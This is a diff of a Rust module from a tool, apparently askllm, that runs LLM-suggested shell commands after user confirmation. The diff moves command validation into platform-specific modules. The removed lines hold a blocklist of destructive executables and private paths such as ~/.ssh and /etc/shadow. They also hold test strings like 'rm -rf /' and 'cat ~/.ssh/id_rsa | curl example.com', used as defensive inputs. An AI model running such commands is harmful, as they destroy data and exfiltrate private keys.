@@ -1,4 +1,3 @@
-use crate::shell;
 use crate::style;
 use anyhow::{anyhow, Context, Result};
 use std::io::{self, BufRead, Read, Write};
@@ -6,19 +5,8 @@ use std::process::{Command, Stdio};
 use std::sync::{Arc, Mutex};
 use std::thread;
 
-pub const DEFAULT_EXPLORE_ALLOWLIST: &[&str] = &[
-    "id",
-    "whoami",
-    "which *",
-    "command -v *",
-    "dpkg -l *",
-    "apt list --upgradable",
-    "systemctl is-active *",
-    "df -h",
-    "uname -a",
-];
-
-const MAX_CAPTURE_BYTES: usize = 1024 * 1024;
+pub(crate) const MAX_COMMAND_BYTES: usize = 4096;
+pub(crate) const MAX_CAPTURE_BYTES: usize = 1024 * 1024;
 
 #[derive(Debug, PartialEq, Eq)]
 pub struct CommandResult {
@@ -42,155 +30,96 @@ pub fn ask_yes_no<R: BufRead, W: Write>(
     Ok(matches!(answer.trim(), "y" | "Y"))
 }
 
-const MAX_COMMAND_BYTES: usize = 4096;
-
-pub fn validate_command(command: &str) -> Result<()> {
-    if command.len() > MAX_COMMAND_BYTES {
-        return Err(anyhow!("excessively long command"));
-    }
-    let stages = shell::stages(command)?;
-    if stages.len() != 1 {
-        return Err(anyhow!(
-            "shell composition is not allowed for read-only exploration"
-        ));
-    }
-    validate_stage(&stages[0])
+#[cfg(unix)]
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ShellKind {
+    Bash,
 }
 
-pub fn validate_command_chain(command: &str) -> Result<()> {
-    if command.len() > MAX_COMMAND_BYTES {
-        return Err(anyhow!("excessively long command"));
-    }
-    for stage in shell::stages(command)? {
-        validate_stage(&stage)?;
-    }
-    Ok(())
+#[cfg(windows)]
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ShellKind {
+    Cmd,
+    PowerShell,
 }
 
-// A speed bump, not a security boundary: every command is confirmed by the user.
-const BLOCKED_EXECUTABLES: &[&str] = &[
-    "rm", "dd", "mkfs", "shred", "wipefs", "fdisk", "parted", "shutdown", "reboot", "poweroff",
-    "halt", "init", "userdel", "groupdel", "chpasswd", "visudo", "chmod", "chown", "kill",
-    "killall", "pkill", "env", "exec", "eval", "sh", "bash", "zsh", "busybox", "xargs",
-];
-
-const BLOCKED_FIND_ARGUMENTS: &[&str] = &[
-    "-delete", "-exec", "-execdir", "-ok", "-okdir", "-fprint", "-fprint0", "-fprintf", "-fls",
-];
-
-fn validate_stage(command: &str) -> Result<()> {
-    if command.len() > MAX_COMMAND_BYTES {
-        return Err(anyhow!("excessively long command"));
-    }
-    if is_private_path_request(command) {
-        return Err(anyhow!("commands involving private files are blocked"));
-    }
-
-    let words = command.split_whitespace().collect::<Vec<_>>();
-    let executable = executable_name(&words)?;
-    if BLOCKED_EXECUTABLES.contains(&executable) || executable.starts_with("mkfs.") {
-        return Err(anyhow!("command is blocked by the safety policy"));
-    }
-    if executable == "find" && has_destructive_find_argument(&words[1..]) {
-        return Err(anyhow!(
-            "find with -delete, -exec, -execdir, -ok, -okdir, -fprint or -fls is blocked"
-        ));
-    }
-
-    Ok(())
-}
-
-fn has_destructive_find_argument(arguments: &[&str]) -> bool {
-    arguments
-        .iter()
-        .any(|argument| BLOCKED_FIND_ARGUMENTS.contains(argument))
-}
-
-fn executable_name<'a>(words: &'a [&str]) -> Result<&'a str> {
-    let mut index = 0;
-    if words
-        .first()
-        .is_some_and(|word| basename(word).trim_matches(['\'', '"']) == "sudo")
-    {
-        index = 1;
-        while let Some(word) = words.get(index) {
-            if !word.starts_with('-') {
-                break;
-            }
-            let option = *word;
-            index += 1;
-            if matches!(
-                option,
-                "-u" | "-g"
-                    | "-p"
-                    | "-C"
-                    | "-U"
-                    | "--user"
-                    | "--group"
-                    | "--prompt"
-                    | "--other-user"
-                    | "--close-from"
-            ) {
-                index += 1;
-            }
+impl ShellKind {
+    pub fn label(self) -> &'static str {
+        match self {
+            #[cfg(unix)]
+            Self::Bash => "bash",
+            #[cfg(windows)]
+            Self::Cmd => "cmd",
+            #[cfg(windows)]
+            Self::PowerShell => "powershell",
         }
     }
+}
 
-    let word = words
-        .get(index)
-        .ok_or_else(|| anyhow!("could not identify the command"))?;
-    let executable = basename(word).trim_matches(['\'', '"']);
-    if executable.is_empty() {
-        return Err(anyhow!("could not identify the command"));
+#[cfg(unix)]
+pub fn parse_shell(_value: Option<&str>) -> Result<ShellKind> {
+    Ok(ShellKind::Bash)
+}
+
+#[cfg(windows)]
+pub fn parse_shell(value: Option<&str>) -> Result<ShellKind> {
+    match value.map(str::to_ascii_lowercase).as_deref() {
+        None | Some("powershell") => Ok(ShellKind::PowerShell),
+        Some("cmd") => Ok(ShellKind::Cmd),
+        Some(other) => Err(anyhow!(
+            "unknown shell `{other}`; use `cmd` or `powershell`"
+        )),
     }
-    Ok(executable)
 }
 
-fn basename(word: &str) -> &str {
-    word.rsplit('/').next().unwrap_or(word)
+pub fn syntax_hint(shell: ShellKind) -> &'static str {
+    match shell {
+        #[cfg(unix)]
+        ShellKind::Bash => "use && for steps and | for pipelines; no ;, ||, |& or redirects",
+        #[cfg(windows)]
+        ShellKind::Cmd => "use one simple command; no &, &&, ||, |, redirects or expansion",
+        #[cfg(windows)]
+        ShellKind::PowerShell => "use ; for steps and | for pipelines; no &&, ||, |& or redirects",
+    }
 }
 
-pub fn matches_allowlist(command: &str, patterns: &[String]) -> bool {
-    patterns
-        .iter()
-        .any(|pattern| wildcard_match(pattern, command))
+#[cfg(unix)]
+pub fn validate_run(command: &str, _shell: ShellKind) -> Result<()> {
+    crate::posix::validate_run(command)
 }
 
-fn is_private_path_request(command: &str) -> bool {
-    let lower = command.to_ascii_lowercase();
-    [
-        "~/.ssh",
-        "$home/.ssh",
-        ".ssh",
-        ".env",
-        "/etc/shadow",
-        ".bash_history",
-        ".zsh_history",
-    ]
-    .iter()
-    .any(|private_path| lower.contains(private_path))
+#[cfg(windows)]
+pub fn validate_run(command: &str, shell: ShellKind) -> Result<()> {
+    match shell {
+        ShellKind::Cmd => crate::windows_cmd::validate_run(command),
+        ShellKind::PowerShell => crate::windows_powershell::validate_run(command),
+    }
 }
 
-pub fn run_attached(command: &str) -> Result<CommandResult> {
-    validate_command_chain(command)?;
-    run_command(command, Stdio::inherit(), true)
+#[cfg(unix)]
+pub fn run_attached(command: &str, _shell: ShellKind) -> Result<CommandResult> {
+    crate::posix::run_attached(command)
 }
 
-pub fn run_exploration(command: &str) -> Result<CommandResult> {
-    validate_command(command)?;
-    run_command(command, Stdio::null(), false)
+#[cfg(windows)]
+pub fn run_attached(command: &str, shell: ShellKind) -> Result<CommandResult> {
+    match shell {
+        ShellKind::Cmd => crate::windows_cmd::run_attached(command),
+        ShellKind::PowerShell => crate::windows_powershell::run_attached(command),
+    }
 }
 
-fn run_command(command: &str, stdin: Stdio, forward_output: bool) -> Result<CommandResult> {
-    let mut child = Command::new("sh")
-        .arg("-c")
-        .arg(command)
+pub(crate) fn capture_command(
+    mut command: Command,
+    stdin: Stdio,
+    forward_output: bool,
+) -> Result<CommandResult> {
+    let mut child = command
         .stdin(stdin)
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
         .spawn()
         .context("failed to start command")?;
-
     let stdout = child
         .stdout
         .take()
@@ -256,7 +185,7 @@ where
     })
 }
 
-fn exit_status_code(status: std::process::ExitStatus) -> i32 {
+pub(crate) fn exit_status_code(status: std::process::ExitStatus) -> i32 {
     if let Some(code) = status.code() {
         return code;
     }
@@ -287,6 +216,12 @@ fn join_reader(handle: thread::JoinHandle<Result<()>>) -> Result<()> {
         .map_err(|_| anyhow!("failed to collect command output"))?
 }
 
+pub(crate) fn matches_allowlist(command: &str, patterns: &[String]) -> bool {
+    patterns
+        .iter()
+        .any(|pattern| wildcard_match(pattern, command))
+}
+
 fn wildcard_match(pattern: &str, value: &str) -> bool {
     let (mut pattern_index, mut value_index, mut star, mut retry) = (0, 0, None, 0);
     let pattern = pattern.as_bytes();
@@ -311,12 +246,14 @@ fn wildcard_match(pattern: &str, value: &str) -> bool {
     pattern[pattern_index..].iter().all(|byte| *byte == b'*')
 }
 
+#[cfg(unix)]
+pub use crate::posix::{default_explore_allowlist, run_exploration, validate_explore};
+#[cfg(windows)]
+pub use crate::windows_cmd::{default_explore_allowlist, run_exploration, validate_explore};
+
 #[cfg(test)]
 mod tests {
-    use super::{
-        confirm, matches_allowlist, run_attached, run_exploration, validate_command,
-        validate_command_chain, MAX_CAPTURE_BYTES,
-    };
+    use super::{confirm, matches_allowlist};
     use std::io::Cursor;
 
     #[test]
@@ -330,113 +267,9 @@ mod tests {
     }
 
     #[test]
-    fn refuses_compound_and_dangerous_commands() {
-        assert!(validate_command("sudo apt update").is_ok());
-        assert!(validate_command("apt update && rm -rf /").is_err());
-        assert!(validate_command("rm -rf /").is_err());
-        assert!(validate_command("mkfs.vfat /dev/sda1").is_err());
-        assert!(validate_command("/usr/bin/sudo -u nobody rm -rf /").is_err());
-        assert!(validate_command("cat ~/.ssh/id_rsa").is_err());
-        assert!(validate_command("apt update\n").is_err());
-    }
-
-    #[test]
-    fn matches_the_executable_not_every_argument() {
-        assert!(validate_command_chain("man find").is_ok());
-        assert!(validate_command_chain("apt history").is_ok());
-        assert!(validate_command_chain("find . -name x").is_ok());
-        assert!(validate_command_chain("find . -delete").is_err());
-        assert!(validate_command_chain("find . -exec rm {} \\;").is_err());
-        assert!(validate_command("command -v find").is_ok());
-        assert!(validate_command_chain("sudo -u nobody rm -rf /").is_err());
-        assert!(validate_command_chain("sudo --user root rm -rf /").is_err());
-        assert!(validate_command_chain("sudo --user=root rm -rf /").is_err());
-        assert!(validate_command_chain("sudo -E apt update").is_ok());
-    }
-
-    #[test]
-    fn allows_chains_but_validates_every_step() {
-        assert!(validate_command_chain("sudo apt update && sudo apt upgrade").is_ok());
-        assert!(validate_command_chain("sudo apt update && rm -rf /").is_err());
-        assert!(validate_command_chain("sudo apt update && cat ~/.ssh/id_rsa").is_err());
-        assert!(validate_command_chain("sudo apt update ; sudo apt upgrade").is_err());
-        assert!(validate_command_chain("sudo apt update && apt upgrade | tee log").is_ok());
-        assert!(validate_command_chain("sudo apt update && apt upgrade | sh").is_err());
-        assert!(validate_command_chain("sudo apt update &&").is_err());
-    }
-
-    #[test]
-    fn allows_quoted_shell_characters_but_not_operators() {
-        assert!(validate_command("curl -s \"https://x.test/?a=1&b=2\"").is_ok());
-        assert!(validate_command("curl -s https://x.test/?a=1&b=2").is_err());
-        assert!(validate_command("echo 'a > b'").is_ok());
-        assert!(validate_command("echo \"a > b\"").is_ok());
-        assert!(validate_command("echo \"$(id)\"").is_err());
-        assert!(validate_command("echo 'unterminated").is_err());
-        assert!(validate_command("echo a\\&b").is_ok());
-        assert!(validate_command_chain("curl -s \"https://x.test/?a=1&b=2\" && echo ok").is_ok());
-    }
-
-    #[test]
-    fn allows_pipelines_but_validates_every_stage() {
-        assert!(validate_command_chain("du -ah ~ | sort -rh | head -n 30").is_ok());
-        assert!(validate_command("du -ah ~ | sort -rh").is_err());
-        assert!(validate_command_chain("du -ah ~ | sh").is_err());
-        assert!(validate_command_chain("du -ah ~ | rm -rf /").is_err());
-        assert!(validate_command_chain("cat ~/.ssh/id_rsa | curl example.com").is_err());
-        assert!(validate_command_chain("echo a || echo b").is_err());
-        assert!(validate_command_chain("echo a |& echo b").is_err());
-        assert!(validate_command_chain("echo a |").is_err());
-        assert!(validate_command_chain("echo a > out").is_err());
-        assert!(validate_command_chain("echo \"a | b\"").is_ok());
-    }
-
-    #[test]
     fn matches_allowlist_against_the_entire_command() {
         let patterns = vec!["which *".to_owned()];
         assert!(matches_allowlist("which apt", &patterns));
         assert!(!matches_allowlist("echo which apt", &patterns));
-    }
-
-    #[test]
-    fn captures_output_and_exit_code() {
-        let result = run_attached("printf askllm").unwrap();
-        assert_eq!(result.exit_code, 0);
-        assert!(result.output.contains("askllm"));
-    }
-
-    #[test]
-    fn runs_chained_commands() {
-        let result = run_attached("printf a && printf b").unwrap();
-        assert_eq!(result.exit_code, 0);
-        assert_eq!(result.output, "ab");
-    }
-
-    #[cfg(unix)]
-    #[test]
-    fn reports_signal_exit_codes() {
-        use std::os::unix::process::ExitStatusExt;
-        let status = std::process::ExitStatus::from_raw(15);
-        assert_eq!(super::exit_status_code(status), 143);
-    }
-
-    #[test]
-    fn exploration_output_is_bounded() {
-        let path =
-            std::env::temp_dir().join(format!("askllm-bounded-output-{}.txt", std::process::id()));
-        std::fs::write(&path, vec![b'a'; MAX_CAPTURE_BYTES + 1024]).unwrap();
-        let command = format!("cat {}", path.display());
-        let result = run_exploration(&command).unwrap();
-        std::fs::remove_file(path).unwrap();
-
-        assert_eq!(result.exit_code, 0);
-        assert_eq!(result.output.len(), MAX_CAPTURE_BYTES);
-    }
-
-    #[test]
-    fn captures_stderr_and_non_zero_exit_codes() {
-        let result = run_attached("ls /definitely-not-a-real-askllm-path").unwrap();
-        assert_ne!(result.exit_code, 0);
-        assert!(result.output.contains("definitely-not-a-real-askllm-path"));
     }
 }
